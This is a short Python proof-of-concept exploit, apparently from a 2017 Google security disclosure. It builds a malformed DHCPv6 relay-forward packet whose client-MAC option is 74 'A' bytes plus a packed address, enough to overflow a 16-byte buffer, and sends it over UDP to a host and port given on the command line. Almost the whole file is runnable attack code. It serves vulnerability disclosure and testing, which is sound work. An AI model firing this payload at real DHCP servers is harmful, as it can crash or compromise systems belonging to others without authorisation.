#!/usr/bin/python
#
# Copyright 2017 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors:
#  Fermin J. Serna <fjserna@google.com>
#  Felix Wilhelm <fwilhelm@google.com>
#  Gabriel Campana <gbrl@google.com>
#  Kevin Hamacher <hamacher@google.com>
#  Gynvael Coldwind <gynvael@google.com>
#  Ron Bowes - Xoogler :/

from struct import pack
import sys
import socket

def send_packet(data, host, port):
    print("[+] sending {} bytes to {}:{}".format(len(data), host, port))
    s = socket.socket(socket.AF_INET6, socket.SOCK_DGRAM, socket.IPPROTO_UDP)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, len(data))
    if s.sendto(data, (host, port)) != len(data):
        print("[!] Could not send (full) payload")
    s.close()

def u8(x):
    return pack("B", x)

def u16(x):
    return pack("!H", x)

def gen_option(option, data, length=None):
    if length is None:
        length = len(data)

    return b"".join([
        u16(option),
        u16(length),
        data
    ])

if __name__ == '__main__':
    assert len(sys.argv) == 3, "{} <ip> <port>".format(sys.argv[0])
    pkg = b"".join([
        u8(12),                         # DHCP6RELAYFORW
        u16(0x0313), u8(0x37),          # transaction ID
        b"_" * (34 - 4),
        # Option 79 = OPTION6_CLIENT_MAC
        # Moves argument into char[DHCP_CHADDR_MAX], DHCP_CHADDR_MAX = 16
        gen_option(79, "A" * 74 + pack("<Q", 0x1337DEADBEEF)),
    ])

    host, port = sys.argv[1:]
    send_packet(pkg, host, int(port))